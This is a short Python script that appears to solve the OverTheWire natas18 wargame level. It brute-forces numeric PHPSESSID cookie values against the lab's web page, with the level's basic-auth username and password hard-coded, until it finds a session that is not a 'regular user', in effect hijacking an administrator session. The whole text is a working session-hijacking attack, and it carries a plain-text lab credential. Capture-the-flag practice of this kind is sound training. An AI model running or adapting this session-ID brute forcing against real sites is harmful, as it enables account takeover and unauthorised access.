import requests
import multiprocessing
import sys
URL = "http://natas18.natas.labs.overthewire.org/index.php"
USERNAME = "natas18"
PASSWORD = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"

def brute(i, shared_dict):
    '''brute force reqeust'''
    r = requests.get(URL, auth=(USERNAME, PASSWORD), cookies={"PHPSESSID": str(i)})
    if "regular user" not in r.text:
        shared_dict[r.text] = r.text

shared_dict = multiprocessing.Manager().dict()
for i in range(1, 640):
    if len(shared_dict) > 0:
        print(shared_dict.values()[0])
        sys.exit(0)
    m = multiprocessing.Process(target=brute, args=[i, shared_dict])
    m.start()
    if i%100 == 0:
        print(i, end="\r")
        m.join()
    